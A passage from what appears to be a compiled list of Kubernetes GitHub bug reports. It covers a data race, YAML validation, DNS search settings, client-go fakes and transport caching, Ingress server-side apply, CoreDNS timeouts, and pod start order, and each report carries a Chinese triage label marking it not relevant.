#### What did you expect to happen?

compile no error

#### How can we reproduce it (as minimally and precisely as possible)?

compile the code

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```
v1.27.1
</details>


#### Cloud provider

<details>
vmware
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

不涉及

---

## Issue #125905 k8s.io/apiserver/pkg/util/version: data race

- Issue 链接：[#125905](https://github.com/kubernetes/kubernetes/issues/125905)

### Issue 内容

#### What happened?

I ran https://github.com/kubernetes/kubernetes/pull/116980 ("make test-integration" with race detection) and it [found](https://prow.k8s.io/view/gs/kubernetes-jenkins/pr-logs/pull/116980/pull-kubernetes-integration/1808940570375098368) this:

```
WARNING: DATA RACE
Write at 0x000007f130c0 by goroutine 49904:
  k8s.io/apiserver/pkg/util/version.(*componentGlobalsRegistry).Reset()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/util/version/registry.go:140 +0xa4
  k8s.io/kubernetes/cmd/kube-apiserver/app/testing.StartTestServer()
      /home/prow/go/src/k8s.io/kubernetes/cmd/kube-apiserver/app/testing/testserver.go:193 +0x8af
  k8s.io/kubernetes/cmd/kube-apiserver/app/testing.StartTestServerOrDie()
      /home/prow/go/src/k8s.io/kubernetes/cmd/kube-apiserver/app/testing/testserver.go:493 +0xd3
  k8s.io/kubernetes/test/integration/controlplane.testReconcilersAPIServerLease.func1()
      /home/prow/go/src/k8s.io/kubernetes/test/integration/controlplane/kube_apiserver_test.go:450 +0x327
  k8s.io/kubernetes/test/integration/controlplane.testReconcilersAPIServerLease.gowrap1()
      /home/prow/go/src/k8s.io/kubernetes/test/integration/controlplane/kube_apiserver_test.go:456 +0x41

Previous read at 0x000007f130c0 by goroutine 49903:
  k8s.io/apiserver/pkg/util/version.(*componentGlobalsRegistry).EffectiveVersionFor()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/util/version/registry.go:149 +0xd4
  k8s.io/apiserver/pkg/server/options.NewServerRunOptions()
      /home/prow/go/src/k8s.io/kubernetes/staging/src/k8s.io/apiserver/pkg/server/options/server_run_options.go:103 +0x4a
  k8s.io/kubernetes/pkg/controlplane/apiserver/options.NewOptions()
      /home/prow/go/src/k8s.io/kubernetes/pkg/controlplane/apiserver/options/options.go:103 +0x44
  k8s.io/kubernetes/cmd/kube-apiserver/app/options.NewServerRunOptions()
      /home/prow/go/src/k8s.io/kubernetes/cmd/kube-apiserver/app/options/options.go:69 +0x44
  k8s.io/kubernetes/cmd/kube-apiserver/app/testing.StartTestServer()
      /home/prow/go/src/k8s.io/kubernetes/cmd/kube-apiserver/app/testing/testserver.go:196 +0x90d
  k8s.io/kubernetes/cmd/kube-apiserver/app/testing.StartTestServerOrDie()
      /home/prow/go/src/k8s.io/kubernetes/cmd/kube-apiserver/app/testing/testserver.go:493 +0xd3
  k8s.io/kubernetes/test/integration/controlplane.testReconcilersAPIServerLease.func1()
      /home/prow/go/src/k8s.io/kubernetes/test/integration/controlplane/kube_apiserver_test.go:450 +0x327
  k8s.io/kubernetes/test/integration/controlplane.testReconcilersAPIServerLease.gowrap1()
      /home/prow/go/src/k8s.io/kubernetes/test/integration/controlplane/kube_apiserver_test.go:456 +0x41

Goroutine 49904 (running) created at:
  k8s.io/kubernetes/test/integration/controlplane.testReconcilersAPIServerLease()
      /home/prow/go/src/k8s.io/kubernetes/test/integration/controlplane/kube_apiserver_test.go:448 +0x15a
  k8s.io/kubernetes/test/integration/controlplane.TestReconcilerAPIServerLeaseCombined()
      /home/prow/go/src/k8s.io/kubernetes/test/integration/controlplane/kube_apiserver_test.go:523 +0x30
  testing.tRunner()
      /home/prow/go/src/k8s.io/kubernetes/_output/local/go/cache/mod/golang.org/toolchain@v0.0.1-go1.22.5.linux-amd64/src/testing/testing.go:1689 +0x21e
  testing.(*T).Run.gowrap1()
      /home/prow/go/src/k8s.io/kubernetes/_output/local/go/cache/mod/golang.org/toolchain@v0.0.1-go1.22.5.linux-amd64/src/testing/testing.go:1742 +0x44

Goroutine 49903 (running) created at:
  k8s.io/kubernetes/test/integration/controlplane.testReconcilersAPIServerLease()
      /home/prow/go/src/k8s.io/kubernetes/test/integration/controlplane/kube_apiserver_test.go:448 +0x15a
  k8s.io/kubernetes/test/integration/controlplane.TestReconcilerAPIServerLeaseCombined()
      /home/prow/go/src/k8s.io/kubernetes/test/integration/controlplane/kube_apiserver_test.go:523 +0x30
  testing.tRunner()
      /home/prow/go/src/k8s.io/kubernetes/_output/local/go/cache/mod/golang.org/toolchain@v0.0.1-go1.22.5.linux-amd64/src/testing/testing.go:1689 +0x21e
  testing.(*T).Run.gowrap1()
      /home/prow/go/src/k8s.io/kubernetes/_output/local/go/cache/mod/golang.org/toolchain@v0.0.1-go1.22.5.linux-amd64/src/testing/testing.go:1742 +0x44
```

#### What did you expect to happen?

no race

#### How can we reproduce it (as minimally and precisely as possible)?

Run test with `go test -race`.

#### Anything else we need to know?

/sig api-machinery


#### Kubernetes version

master, https://github.com/kubernetes/kubernetes/commit/4352c4ad2762ce49ce30e62381f8ceb24723fbcc#diff-ef6e00030a35e9f551147a13c845de47ad1328e78d3712f37574ba033bba4308

/cc @siyuanfoundation 

#### Cloud provider

n/a


#### OS version

_No response_

#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

不涉及

---

## Issue #125885 Multi-container pod creation from YAML with multiple "containers" statements

- Issue 链接：[#125885](https://github.com/kubernetes/kubernetes/issues/125885)

### Issue 内容

#### What happened?

Trying to create a POD object, from YAML file, with the following structure, does not throw error.
```
apiVersion: v1
kind: Pod
metadata:
  creationTimestamp: null
  labels:
    run: busybox
  name: busybox
spec:
  containers:
  - args:
    - /bin/sh
    - -c
    - echo Hello World!
    image: busybox
    name: busybox
    resources: {}
  containers:
  - args:
    - /bin/sh
    - -c
    - echo Hello World!
    image: busybox
    name: busybox2
    resources: {}
  containers:
  - args:
    - /bin/sh
    - -c
    - echo Hello World!
    image: busybox
    name: busybox3
    resources: {}
  dnsPolicy: ClusterFirst
  restartPolicy: Never
status: {}
```

The result of the creation of this object is:
```
controlplane $ k create -f po.yaml
pod/busybox created
controlplane $ k get po
NAME      READY   STATUS      RESTARTS   AGE
busybox   0/1     Completed   0          8s
```
The pod will never go to "Ready" status. The event in the pod description are:
```
Events:
  Type    Reason     Age   From               Message
  ----    ------     ----  ----               -------
  Normal  Scheduled  19s   default-scheduler  Successfully assigned default/busybox to node01
  Normal  Pulling    18s   kubelet            Pulling image "busybox"
  Normal  Pulled     18s   kubelet            Successfully pulled image "busybox" in 165ms (165ms including waiting). Image size: 2160406 bytes.
  Normal  Created    18s   kubelet            Created container busybox3
  Normal  Started    18s   kubelet            Started container busybox3
```
 

#### What did you expect to happen?

My understanding is that the "spec" section of this YAML in not correct. I expect no object to be created, when to create such from this YAML file. The behavior as of now is confusing and inconsistent. An error should be throw, informing the user that he should fix the YAML file structure.

#### How can we reproduce it (as minimally and precisely as possible)?

1. Create a YAML file with the provided example in the "What happened?" section, name it `po.yaml`
2. Create the object using imperative command `kubectl create -f po.yaml`

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
Client Version: v1.30.0
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.30.0
```
</details>


#### Cloud provider

<details>

`https://killercoda.com/killer-shell-ckad/scenario/playground`

</details>


#### OS version

<details>

```console
NAME="Ubuntu"
VERSION="20.04.5 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.5 LTS"
VERSION_ID="20.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

不涉及

---

## Issue #125883 Pod dnsConfig.searches should be allowed setting "search" to a dot.

- Issue 链接：[#125883](https://github.com/kubernetes/kubernetes/issues/125883)

### Issue 内容

#### What happened?

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: test
  namespace: default
spec:
  containers:
  - image: alpine
    command:
      - sleep
      - "10000"
    imagePullPolicy: Always
    name: alpine
  dnsPolicy: None
  dnsConfig:
    nameservers:
    - "192.168.0.10"
    searches:
    - .
    - default.svc.cluster.local
    - svc.cluster.local
    - cluster.local
    options:
    - name: ndots
      value: "3"
```

Applying this pod YAML to Kubernetes will result in an error like this:

```shell
The Pod "test" is invalid: spec.dnsConfig.searches[0]: Invalid value: "": a lowercase RFC 1123 subdomain must consist of lower case alphanumeric characters, '-' or '.', and must start and end with an alphanumeric character (e.g. 'example.com', regex used for validation is '[a-z0-9]([-a-z0-9]*[a-z0-9])?(\.[a-z0-9]([-a-z0-9]*[a-z0-9])?)*')
```


It seems unreasonable because the /etc/resolv.conf file allows a configuration with a dot, and it can be very meaningful in specific scenarios.



#### What did you expect to happen?

no error

#### How can we reproduce it (as minimally and precisely as possible)?

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: test
  namespace: default
spec:
  containers:
  - image: alpine
    command:
      - sleep
      - "10000"
    imagePullPolicy: Always
    name: alpine
  dnsPolicy: None
  dnsConfig:
    nameservers:
    - "192.168.0.10"
    searches:
    - .
    - default.svc.cluster.local
    - svc.cluster.local
    - cluster.local
    options:
    - name: ndots
      value: "3"
```
apply this yaml to kubernetes

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>
any
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

不涉及

---

## Issue #125879 [client-go] FakeDiscovery.ServerResourcesForGroupVersion does not return errors other than NotFound

- Issue 链接：[#125879](https://github.com/kubernetes/kubernetes/issues/125879)

### Issue 内容

#### What happened?

I'm writing a UT for the following function:
```go
func isResourceRegistered(discoveryClient discovery.DiscoveryInterface, gvk schema.GroupVersionKind) (bool, error) {
	apiResourceLists, err := discoveryClient.ServerResourcesForGroupVersion(gvk.GroupVersion().String())
	if err != nil {
		if errors.IsNotFound(err) {
			return false, nil
		}
		return false, err
	}
	for _, apiResource := range apiResourceLists.APIResources {
		if apiResource.Kind == gvk.Kind {
			return true, nil
		}
	}
	return false, nil
}
```
The code branch where the server returns an error other than `NotFound` could not be tested using `client-go`'s `FakeDiscovery`. This is because `FakeDiscovery.ServerResourcesForGroupVersion` does not handle the error returned by `c.Invokes` and therefore could not return errors other than `NotFound`:
```go
func (c *FakeDiscovery) ServerResourcesForGroupVersion(groupVersion string) (*metav1.APIResourceList, error) {
	action := testing.ActionImpl{
		Verb:     "get",
		Resource: schema.GroupVersionResource{Resource: "resource"},
	}
	c.Invokes(action, nil)
	for _, resourceList := range c.Resources {
		if resourceList.GroupVersion == groupVersion {
			return resourceList, nil
		}
	}
	return nil, &errors.StatusError{
		ErrStatus: metav1.Status{
			Status:  metav1.StatusFailure,
			Code:    http.StatusNotFound,
			Reason:  metav1.StatusReasonNotFound,
			Message: fmt.Sprintf("the server could not find the requested resource, GroupVersion %q not found", groupVersion),
		}}
}
```
Ref: https://github.com/kubernetes/client-go/blob/ab86e03da476bd58948f318b4f73d67d0801fcbd/discovery/fake/discovery.go#L45-L63

#### What did you expect to happen?

Add a `Reactor` to `Fake.ReactionChain` so simulate errors other than `NotFound`. 

#### How can we reproduce it (as minimally and precisely as possible)?

Run the following UT (should fail):
```go
func TestIsResourceRegistered(t *testing.T) {
	fakeDiscoveryClient := &fakediscovery.FakeDiscovery{Fake: &clientgotesting.Fake{}}
	fakeDiscoveryClient.PrependReactor("get", "*", func(action clientgotesting.Action) (bool, runtime.Object, error) {
		return true, nil, apierrors.NewTooManyRequests("too many requests", 1)
	})
	t.Run("Server returns errors other than NotFound", func(t *testing.T) {
		_, err := isResourceRegistered(fakeDiscoveryClient, schema.GroupVersionKind{Group: "foo", Version: "bar", Kind: "baz"})
		if err == nil {
			t.Errorf("Error must be non-nil")
		}
	})
}
```

### 分析结果

不涉及

---

## Issue #125869 Using server-side-apply for an Ingress failed when updating IngressBackend from port number to port name

- Issue 链接：[#125869](https://github.com/kubernetes/kubernetes/issues/125869)

### Issue 内容

#### What happened?

I created an Ingress resource with a port number manually, and then tried to use an Operator with server-side apply to update the resource from a port number to a port name. This failed with the error message "cannot set both port name & port number".

#### What did you expect to happen?

I expected the port number to be cleared as the operator would take over the ownership of the ServiceBackendPort. 

#### How can we reproduce it (as minimally and precisely as possible)?

To simulate the behavior in the operator in a most simple example I use `kubectl`:

ingress-v1.yaml:

```
kind: Ingress
apiVersion: networking.k8s.io/v1
metadata:
  name: myingress
spec:
  defaultBackend:
    service:
      name: myservice
      port:
        number: 8443
```

ingress-v2.yaml:

```
kind: Ingress
apiVersion: networking.k8s.io/v1
metadata:
  name: myingress
spec:
  defaultBackend:
    service:
      name: myservice
      port:
        name: http
```

```
kubectl apply -f  ingress-v1.yaml --server-side --field-manager=app-1 --validate=false
kubectl apply -f  ingress-v2.yaml --server-side --field-manager=app-2 --validate=false  --force-conflicts 
```

This will print: 

> The Ingress "myingress" is invalid: spec.defaultBackend: Invalid value: "": cannot set both port name & port number


#### Anything else we need to know?

It seems to me that the merge type for the struct ServiceBackendPort should to be set to "atomic" [according to this doc](https://kubernetes.io/docs/reference/using-api/server-side-apply/#merge-strategy), so that the Operator updating the port  should take over the whole struct, and two applications shouldn't update single fields in it.

https://github.com/kubernetes/kubernetes/blob/0cc57258c3f8545c8250f0e7a1307fd01b0d283d/staging/src/k8s.io/api/networking/v1/types.go#L523-L544

#### Kubernetes version

```
$ kubectl version
Client Version: v1.30.2
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.28.9+416ecaf
```

#### Cloud provider

Red Hat OpenShift on AWS


#### OS version

OS version of the client:

NAME="Fedora Linux"
VERSION="40 (Workstation Edition)"

Linux fedora.fritz.box 6.9.6-200.fc40.x86_64 #1 SMP PREEMPT_DYNAMIC Fri Jun 21 15:48:21 UTC 2024 x86_64 GNU/Linux

#### Install tools

-

#### Container runtime (CRI) and version (if applicable)

-

#### Related plugins (CNI, CSI, ...) and versions (if applicable)

-

### 分析结果

不涉及

---

## Issue #125845 CoreDNS pod waits on kubernetes indefinitely, fails to start

- Issue 链接：[#125845](https://github.com/kubernetes/kubernetes/issues/125845)

### Issue 内容

#### What happened?

I have recently attempted to setup a 3-node Kubernetes cluster. However, when doing so, only one of the two coreDNS services functions correctly.

```
$ kubectl get pods -n kube-system
NAME                                               READY   STATUS    RESTARTS   AGE
coredns-8445fcc4f-jknn4                            0/1     Running   0          15s
coredns-8445fcc4f-q9fhg                            1/1     Running   0          15s
...
 ```

The latter waits indefinitely trying to contact the Kubernetes API server, while the former has no issue doing so.

```
$ kubectl logs coredns-8445fcc4f-jknn4 -n kube-system
[INFO] plugin/kubernetes: waiting for Kubernetes API before starting server
[INFO] plugin/kubernetes: waiting for Kubernetes API before starting server
[INFO] plugin/ready: Still waiting on: "kubernetes"
[INFO] plugin/kubernetes: waiting for Kubernetes API before starting server
[INFO] plugin/kubernetes: waiting for Kubernetes API before starting server
[INFO] plugin/ready: Still waiting on: "kubernetes"
[INFO] plugin/kubernetes: waiting for Kubernetes API before starting server
[INFO] plugin/kubernetes: waiting for Kubernetes API before starting server
[INFO] plugin/kubernetes: waiting for Kubernetes API before starting server
[INFO] plugin/kubernetes: waiting for Kubernetes API before starting server
[INFO] plugin/kubernetes: waiting for Kubernetes API before starting server
[WARNING] plugin/kubernetes: starting server with unsynced Kubernetes API
.:53
[INFO] plugin/reload: Running configuration SHA512 = e86eec8c3e0c3adb80235229780abb66881650dc91692d52bb32af2b1913df5ef7f3056dfa3f3e3e4230a7b54cd215aa7e7cd5e191cfba434e6efed2166f07fb
CoreDNS-1.11.1
linux/amd64, go1.20.7, ae2bbc2
[INFO] plugin/ready: Still waiting on: "kubernetes"
[INFO] plugin/ready: Still waiting on: "kubernetes"
[INFO] plugin/ready: Still waiting on: "kubernetes"
[INFO] plugin/kubernetes:[ pkg/mod/k8s.io/client-go@v0.27.4/tools/cache/reflector.go:231](mailto:pkg/mod/k8s.io/client-go@v0.27.4/tools/cache/reflector.go:231): failed to list *v1.Namespace: Get [https://10.96.0.1:443/api/v1/namespaces?limit=500&resourceVersion=0](https://10.96.0.1/api/v1/namespaces?limit=500&resourceVersion=0): dial tcp 10.96.0.1:443: i/o timeout
[INFO] plugin/kubernetes: Trace[2128346993]: "Reflector ListAndWatch" name:pkg/mod/k8s.io/client-go@v0.27.4/tools/cache/reflector.go:231 (02-Jul-2024 14:49:34.632) (total time: 30001ms):
Trace[2128346993]: ---"Objects listed" error:Get[ https://10.96.0.1:443/api/v1/namespaces?limit=500&resourceVersion=0](https://10.96.0.1/api/v1/namespaces?limit=500&resourceVersion=0): dial tcp 10.96.0.1:443: i/o timeout 30001ms (14:50:04.634)
...
```

The following is the "kubectl describe" output for the faulty pod.

```
Name:                 coredns-8445fcc4f-jknn4
Namespace:            kube-system
Priority:             2000000000
Priority Class Name:  system-cluster-critical
Service Account:      coredns
Node:                 nyctrccidslx025.nyct.com/10.129.37.221
Start Time:           Tue, 02 Jul 2024 10:49:33 -0400
Labels:               k8s-app=kube-dns
                      pod-template-hash=8445fcc4f
Annotations:          cni.projectcalico.org/containerID: c68ceb6bf037510f80f7d0279230b800b153404558d8153dba37e20bf846c7ef
                      cni.projectcalico.org/podIP: 10.94.17.200/32
                      cni.projectcalico.org/podIPs: 10.94.17.200/32
                      kubectl.kubernetes.io/restartedAt: 2024-07-02T10:49:33-04:00
Status:               Running
IP:                   10.94.17.200
IPs:
  IP:           10.94.17.200
Controlled By:  ReplicaSet/coredns-8445fcc4f
Containers:
  coredns:
    Container ID:  containerd://4cfaf364a1c397030e541c71ffd62856053bb9b712b8951dad61b9a441cc095a
    Image:         registry.k8s.io/coredns/coredns:v1.11.1
    Image ID:     [ registry.k8s.io/coredns/coredns@sha256:1eeb4c7316bacb1d4c8ead65571cd92dd21e27359f0d4917f1a5822a73b75db1](mailto:registry.k8s.io/coredns/coredns@sha256:1eeb4c7316bacb1d4c8ead65571cd92dd21e27359f0d4917f1a5822a73b75db1)
    Ports:         53/UDP, 53/TCP, 9153/TCP
    Host Ports:    0/UDP, 0/TCP, 0/TCP
    Args:
      -conf
      /etc/coredns/Corefile
    State:          Running
      Started:      Tue, 02 Jul 2024 10:49:34 -0400
    Ready:          False
    Restart Count:  0
    Limits:
      memory:  170Mi
    Requests:
      cpu:        100m
      memory:     70Mi
    Liveness:     http-get http://:8080/health delay=60s timeout=5s period=10s #success=1 #failure=5
    Readiness:    http-get http://:8181/ready delay=0s timeout=1s period=10s #success=1 #failure=3
    Environment:  <none>
    Mounts:
      /etc/coredns from config-volume (ro)
      /var/run/secrets/kubernetes.io/serviceaccount from kube-api-access-pv4rd (ro)
Conditions:
  Type                        Status
  PodReadyToStartContainers   True
  Initialized                 True
  Ready                       False
  ContainersReady             False
  PodScheduled                True
Volumes:
  config-volume:
    Type:      ConfigMap (a volume populated by a ConfigMap)
    Name:      coredns
    Optional:  false
  kube-api-access-pv4rd:
    Type:                    Projected (a volume that contains injected data from multiple sources)
    TokenExpirationSeconds:  3607
    ConfigMapName:           kube-root-ca.crt
    ConfigMapOptional:       <nil>
    DownwardAPI:             true
QoS Class:                   Burstable
Node-Selectors:              kubernetes.io/os=linux
Tolerations:                 CriticalAddonsOnly op=Exists
                             node-role.kubernetes.io/control-plane:NoSchedule
                             node.kubernetes.io/not-ready:NoExecute op=Exists for 300s
                             node.kubernetes.io/unreachable:NoExecute op=Exists for 300s
Events:
  Type     Reason     Age                  From               Message
  ----     ------     ----                 ----               -------
  Normal   Scheduled  51m                  default-scheduler  Successfully assigned kube-system/coredns-8445fcc4f-jknn4 to nyctrccidslx025.nyct.com
  Normal   Pulled     51m                  kubelet            Container image "registry.k8s.io/coredns/coredns:v1.11.1" already present on machine
  Normal   Created    51m                  kubelet            Created container coredns
  Normal   Started    51m                  kubelet            Started container coredns
  Warning  Unhealthy  69s (x342 over 51m)  kubelet            Readiness probe failed: HTTP probe failed with statuscode: 503
```


#### What did you expect to happen?

The coreDNS pod should be able to connect to the kubernetes API server without problems.

#### How can we reproduce it (as minimally and precisely as possible)?

This is a difficult issue to reproduce, but I setup my system as follows.

 (1) Establish a 3-node kubernetes cluster consisting of nodes on the same LAN.

(2) Install calico using `tigera-operator.yaml`.

(3) Use the following coredns config map.

```
apiVersion: v1
data:
  Corefile: |
    .:53 {
        log
        errors
        health {
           lameduck 5s
        }
        ready
        kubernetes cluster.local in-addr.arpa ip6.arpa {
           pods insecure
           fallthrough in-addr.arpa ip6.arpa
           ttl 30
        }
        prometheus :9153
        forward . /etc/resolv.conf {
           max_concurrent 1000
        }
        cache 30
        #loop
        reload
        loadbalance
    }
kind: ConfigMap
metadata:
  creationTimestamp: "2024-06-25T20:06:12Z"
  name: coredns
  namespace: kube-system
  resourceVersion: "1261664"
  uid: f0837e49-308b-4167-89af-1a182a81aea4
```

#### Anything else we need to know?

I have verified that the DNS containers have the appropriate permissions and endpoints and that their /etc/resolv.conf files are correct, as per the instructions in the [DNS debugging page](https://kubernetes.io/docs/tasks/administer-cluster/dns-debugging-resolution/) on the kubernetes website. I have also commented out the "loop" term from the coreDNS configmap, in line with the advice from [this SO answer](https://stackoverflow.com/a/52722544/24070308), but the container remains unable to contact kubernetes.

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.30.2
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.30.2
```

</details>


#### Cloud provider

N/A

#### OS version

<details>
```$ cat /etc/os-release
NAME="Red Hat Enterprise Linux Server"
VERSION="7.9 (Maipo)"
ID="rhel"
ID_LIKE="fedora"
VARIANT="Server"
VARIANT_ID="server"
VERSION_ID="7.9"
PRETTY_NAME=RHEL
ANSI_COLOR="0;31"
CPE_NAME="cpe:/o:redhat:enterprise_linux:7.9:GA:server"
HOME_URL=https://www.redhat.com/
BUG_REPORT_URL=https://bugzilla.redhat.com/
```
</details>

#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>
containerd 1.6.33
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

不涉及

---

## Issue #125818 client-go: global transport cache grows unbounded when requesting configs with non-nil `Dial` functions

- Issue 链接：[#125818](https://github.com/kubernetes/kubernetes/issues/125818)

### Issue 内容

#### What happened?

client-go 1.26+ changed the semantics of `kubernetes.NewForConfig(restConfig)` by caching TLS transport objects in some cases which were not cached in earlier versions (notably, configurations with non-nil `Dial` functions).

Unfortunately the cache does not have any expire or pruning mechanism, leading in worst case to unbounded growth of memory usage (see for example kubernetes/kubernetes#117250).

The change is: kubernetes/kubernetes#112450

This issue is for a program using client-go (Rancher) requesting clientsets with non-nil Dial functions over time.

#### What did you expect to happen?

TLS transport objects not to be internally cached by client-go, like in 1.25 and earlier versions.

#### How can we reproduce it (as minimally and precisely as possible)?

`	clientset, err := kubernetes.NewForConfig(config)`

with `config.Dial` being non-nil.

I will be submitting a PR that unit-test covers this.

#### Anything else we need to know?

_No response_

#### Kubernetes version

1.26 and over


#### Cloud provider

any

#### OS version

any

#### Install tools

any

#### Container runtime (CRI) and version (if applicable)

n/a


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

n/a

### 分析结果

不涉及

---

## Issue #125815 Pod starting order after restart doesn't follow pod priorities

- Issue 链接：[#125815](https://github.com/kubernetes/kubernetes/issues/125815)

### Issue 内容

#### What happened?

Currently, after kubelet is restarted, pods are brought up in the order of creation, which can be completely random. This behaviour has been documented previously in #118452. What this causes is that the priorities of pods are ignored completely, and that pods that can't start until other pods are up can be started first, causing them to be stuck crashing and restarting for a while. While this eventually clears up, the process is wasting resources and time. 



#### What did you expect to happen?

The pods should be started in the order determined by their priorities, pod with the highest priority being started first.

#### How can we reproduce it (as minimally and precisely as possible)?

The cause is visible in the code, and can be observed in the logs after a restart. 

#### Anything else we need to know?

The suggested fix is to change the starting order of the pods, sorting them firstly by the priority order and secondarily by the creation time. With this, the pods with dependencies are started after the pods they require, which should mean less crashes and restarts. This would also follow the expected behavior when using pod priorities.

I acknowledge that using the priority order won't solve the problem completely, which is why the author of #118452 closed that issue, but argue that with larger scale environments, there is a noticeable benefit to be gained from just this partial fix. 

If this is okay, I'd be willing to start working on the fix. 

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

不涉及

---

